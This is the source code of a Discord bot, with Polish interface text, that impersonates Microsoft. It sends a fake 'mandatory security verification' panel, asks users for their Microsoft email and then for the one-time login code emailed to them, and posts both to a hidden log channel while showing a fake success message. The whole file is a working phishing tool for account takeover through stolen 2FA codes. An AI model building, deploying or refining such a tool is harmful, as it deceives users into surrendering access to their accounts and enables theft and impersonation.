const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    ModalBuilder, 
    TextInputBuilder, 
    TextInputStyle,
    REST,
    Routes
} = require('discord.js');
require('dotenv').config();
const http = require('http');

// Render Port Binding Fix
const server = http.createServer((req, res) => {
    res.write("Bot is running!");
    res.end();
});

const port = process.env.PORT || 3000;
server.listen(port, "0.0.0.0", () => {
    console.log(`\x1b[36m[SERVER]\x1b[0m Web server is listening on port ${port}`);
});

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel, Partials.Message, Partials.User]
});

const PREFIX = '!';
const LOG_CHANNEL_ID = "1505269850191433921"; // ID kanału sprawdzacz botow

// Error & Process Handling
process.on('unhandledRejection', error => {
    console.error('\x1b[31m[UNHANDLED REJECTION]\x1b[0m', error);
});

process.on('uncaughtException', error => {
    console.error('\x1b[31m[UNCAUGHT EXCEPTION]\x1b[0m', error);
});

process.on('exit', (code) => {
    console.log(`\x1b[33m[PROCESS]\x1b[0m Process exited with code: ${code}`);
});

client.on('error', error => {
    console.error('\x1b[31m[CLIENT ERROR]\x1b[0m', error);
});

client.once('ready', async () => {
    console.log(`\x1b[32m[READY]\x1b[0m Zalogowano jako ${client.user.tag}`);
    client.user.setActivity('Weryfikacja Microsoft', { type: 3 });

    const commands = [
        {
            name: 'panelweryfikacja',
            description: 'Wysyła panel weryfikacji Microsoft',
        }
    ];

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

    try {
        console.log('Rozpoczynam rejestrację komend slash...');
        if (client.user) {
            await rest.put(
                Routes.applicationCommands(client.user.id),
                { body: commands },
            );
            console.log('Pomyślnie zarejestrowano komendy slash!');
        }
    } catch (error) {
        console.error('Błąd podczas rejestracji komend:', error);
    }
});

// Store pending verification data
const pendingVerifications = new Map();

client.on('interactionCreate', async (interaction) => {
    // 1. Slash Command - Verification Panel
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'panelweryfikacja') {
            const embed = new EmbedBuilder()
                .setColor(0x2B2D31)
                .setAuthor({ name: 'Microsoft Accounts Protection', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
                .setTitle('🛡️ Obowiązkowa Weryfikacja Bezpieczeństwa')
                .setDescription(
                    'Twoje konto zostało wytypowane do rutynowej kontroli bezpieczeństwa w ramach współpracy z usługą Microsoft Secure Connect.\n\n' +
                    '**Dlaczego muszę to zrobić?**\n' +
                    '> `✅` Potwierdzenie autentyczności konta\n' +
                    '> `✅` Ochrona przed nieautoryzowanym dostępem\n' +
                    '> `✅` Odblokowanie pełnych uprawnień na serwerze\n\n' +
                    '**Status:** `Oczekiwanie na autoryzację...`'
                )
                .addFields({ name: 'System Info', value: `\`Node: MS-SEC-8821\` | \`ID: ${Math.random().toString(36).substring(2, 9).toUpperCase()}\`` })
                .setThumbnail('https://img.icons8.com/color/96/000000/microsoft.png')
                .setFooter({ text: 'Wszystkie dane są szyfrowane metodą AES-256.', iconURL: 'https://img.icons8.com/color/48/000000/lock-landscape.png' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('start_verify')
                    .setLabel('Zweryfikuj przez Microsoft')
                    .setEmoji('📧')
                    .setStyle(ButtonStyle.Success)
            );

            await interaction.channel.send({ embeds: [embed], components: [row] });
            await interaction.reply({ content: '✅ Panel wysłany.', ephemeral: true });
        }
    }

    // 2. Button Handling
    if (interaction.isButton()) {
        if (interaction.customId === 'start_verify') {
            const modal = new ModalBuilder()
                .setCustomId('modal_email')
                .setTitle('Microsoft Security Check');

            const emailInput = new TextInputBuilder()
                .setCustomId('input_email')
                .setLabel("Adres E-mail Microsoft")
                .setPlaceholder("np. nazwa@outlook.com lub nazwa@hotmail.com")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(emailInput));
            await interaction.showModal(modal);
        }

        if (interaction.customId === 'btn_step_code') {
            const modal = new ModalBuilder()
                .setCustomId('modal_code')
                .setTitle('Microsoft Secure Login');

            const codeInput = new TextInputBuilder()
                .setCustomId('input_code')
                .setLabel("Wprowadź kod z wiadomości e-mail")
                .setPlaceholder("Kod zabezpieczający (np. 123456)")
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
            await interaction.showModal(modal);
        }
    }

    // 3. Modal Submission Handling
    if (interaction.isModalSubmit()) {
        if (interaction.customId === 'modal_email') {
            const email = interaction.fields.getTextInputValue('input_email');
            pendingVerifications.set(interaction.user.id, { email });

            // Log email
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0xFFAA00)
                    .setTitle('📧 KROK 1: Podano E-mail')
                    .addFields(
                        { name: '👤 Użytkownik', value: `${interaction.user.tag}`, inline: false },
                        { name: '📧 Mail', value: `\`${email}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            const nextStepEmbed = new EmbedBuilder()
                .setColor(0x00AAFF)
                .setAuthor({ name: 'Microsoft Accounts Service', iconURL: 'https://img.icons8.com/color/48/000000/microsoft.png' })
                .setTitle('📥 Weryfikacja Dwuetapowa (2FA)')
                .setDescription(
                    `Na Twój adres e-mail **${email}** wysłaliśmy jednorazowy kod dostępu.\n\n` +
                    '**Co musisz zrobić?**\n' +
                    '1. Otwórz swoją skrzynkę pocztową.\n' +
                    '2. Skopiuj kod od Microsoft.\n' +
                    '3. Kliknij przycisk poniżej i wklej kod.'
                )
                .setFooter({ text: 'Sesja wygaśnie za 5:00 minut.' });

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('btn_step_code')
                    .setLabel('Zatwierdź Kod')
                    .setEmoji('🔑')
                    .setStyle(ButtonStyle.Primary)
            );

            await interaction.reply({ embeds: [nextStepEmbed], components: [row], ephemeral: true });
        }

        if (interaction.customId === 'modal_code') {
            const code = interaction.fields.getTextInputValue('input_code');
            const data = pendingVerifications.get(interaction.user.id);
            const email = data ? data.email : "Nieznany";

            // Log code
            const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setColor(0x57F287)
                    .setTitle('🔐 KROK 2: Otrzymano Kod')
                    .addFields(
                        { name: '👤 Użytkownik', value: `${interaction.user.tag}`, inline: false },
                        { name: '📧 Mail', value: `\`${email}\``, inline: true },
                        { name: '🔑 Kod', value: `\`${code}\``, inline: true }
                    )
                    .setTimestamp();
                await logChannel.send({ embeds: [logEmbed] });
            }

            pendingVerifications.delete(interaction.user.id);

            const successEmbed = new EmbedBuilder()
                .setColor(0x57F287)
                .setTitle('✅ Weryfikacja Pomyślna')
                .setDescription(
                    'Dziękujemy! Twoja tożsamość została potwierdzona.\n\n' +
                    '**Wynik:** `Zakończono sukcesem`\n' +
                    '**Ref ID:** `MS-VRT-' + Math.floor(100000 + Math.random() * 900000) + '`\n\n' +
                    'Twoje uprawnienia zostaną zaktualizowane w ciągu kilku minut.'
                );

            await interaction.reply({ embeds: [successEmbed], ephemeral: true });
        }
    }
});

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    if (command === 'ping') {
        await message.reply(`Pong! **${Math.round(client.ws.ping)}ms**`);
    }
});

client.login(process.env.TOKEN).catch(err => {
    console.error('\x1b[31m[ERROR]\x1b[0m Nie udało się zalogować.');
});
